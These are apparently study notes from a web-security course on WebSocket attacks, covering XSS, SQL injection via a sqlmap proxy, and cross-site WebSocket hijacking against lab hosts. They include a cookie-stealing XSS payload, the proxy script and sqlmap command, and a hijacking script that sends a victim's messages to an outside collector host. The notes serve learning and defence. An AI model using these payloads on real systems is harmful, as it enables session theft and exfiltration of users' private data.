# Other attacks via WebSockets

# XSS

- We can inject XSS payloads via the websockets if not sanitized correctly
- For example when we send messages in a chat app to other users
    
    ![Untitled](Other%20attacks%20via%20WebSockets/Untitled.png)
    
    ```bash
    <img/src/onerror="socket.send(document.cookie)">
    ```
    

# SQLi

[https://github.com/BKreisel/sqlmap-websocket-proxy](https://github.com/BKreisel/sqlmap-websocket-proxy)

- When we instead of sending messages to other users display messages on the page directly
    
    ![Untitled](Other%20attacks%20via%20WebSockets/Untitled%201.png)
    
- [sqlmap](https://sqlmap.org/) has problems with websockets sometimes
    - Write a middleware that takes the SQLi payload from sqlmap, open a websocket, forward the payload
    - Example
        
        ```python
        from flask import Flask, request
        from websocket import create_connection
        import json
        
        app = Flask(__name__)
        
        WS_URL = 'ws://172.17.0.2/dbconnector'
        
        @app.route('/')
        def index():
            req = {}
            req['username'] = request.args.get('username', '')
        
            ws = create_connection(WS_URL)
            ws.send(json.dumps(req))
            r = json.loads(ws.recv())
            ws.close()
        
            if r.get('error'):
                return r['error']
        
            return r['messages']
        
        app.run(host='127.0.0.1', port=8000)
        ```
        
    - `sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt`

<aside>
ℹ️ **Note:** We can attempt supplying the WebSocket URL directly to sqlmap.

</aside>

<aside>
ℹ️ **Note:** While we've demonstrated the exploitation of XSS and SQLi over WebSockets, it's worth noting that similar techniques can be applied to exploit other prevalent web vulnerabilities, including Command Injection or Local File Inclusion (LFI).

</aside>

# CSWH

https://christian-schneider.net/blog/cross-site-websocket-hijacking/

- Vulnerablillity resulting from `CSRF` attack on the handshake
- Due to `SOP` regular CSRF attacks can not access the response
    - WebSockets however can
    - Not as strictly bound to SOP as HTTP requests
- Provide attackers with read access to data sent over WebSocket

## **Identifying the Vulnerability**

- Example
    
    ```python
    @sock.route('/messages')
    def messages(sock):
        if not session.get('logged_in'):
            sock.send('{"error":"Unauthorized"}')
            return
    
        while True:
            response = {}
    
            try:
                data = sock.receive(timeout=1)
                if not data == '!get_messages':
                    continue
                
                username = session.get('user', '')
                messages = fetch_messages(username)
    
                if not messages:
                    response['error'] = "No messages for this user!"
                else:  
                    response['messages'] = [msg[0] for msg in messages]
    
                sock.send(json.dumps(response))
    
            except Exception as e:
                response['error'] = "An error occured!"
                sock.send(json.dumps(response))
    ```
    
    - There are no additional protections to protect from CSRF attacks, such as checking for CSRF tokens or validating the `Origin` header. Therefore, the web application is vulnerable to CSRF attacks on the WebSocket handshak
    - We can initiate a new WebSocket connection and provide a different `Origin` header to confirm the vulnerability, imitating a cross-origin request
    
    ```python
    GET /messages HTTP/1.1
    Host: 172.17.0.2:80
    Connection: Upgrade
    Upgrade: websocket
    Origin: http://crossdomain.htb
    Sec-WebSocket-Version: 13
    Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZEQwlQ.ZoJ2yDD1Ujx5wzp54vXWN97j1LM
    Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
    ```
    
    - If we now send the message `!get_messages` via the WebSocket connection, the server responds with the messages for our user just like it did before, thus proving a CSWH vulnerability
    
    ## **Exploitation**
    
    ```jsx
    <script>
      function send_message(event){
        socket.send('!get_messages');
      };
    
      const socket = new WebSocket('ws://172.17.0.2:80/messages');
      socket.onopen = send_message;
      socket.addEventListener('message', ev => {
        fetch('http://ch23a202vtc0000138p0getbibyyyyyyb.oast.fun/', {method: 'POST', mode: 'no-cors', body: ev.data});
      });
    </script>
    ```
    
    - *The admin user of the vulnerable web application visits `cwshpayload.htb`*
    - *The exploit code runs, creating the WebSocket connection to the vulnerable site in the context of the admin user and exfiltrates the admin's messages to `interact.sh`*
    - In real-world scenarios, we might need to send multiple messages to the server and react dynamically to the web server's messages
    - However, this is not a problem since the Same-Origin policy does not apply

<aside>
ℹ️ **Note:** For this exploit to work, the `SameSite` cookie flag must be set to `None`. Since most browsers apply a default value of `Lax` if the `SameSite` cookie attribute is not set, the attack's success would require a deliberately insecure configuration by the web application administrator.

</aside>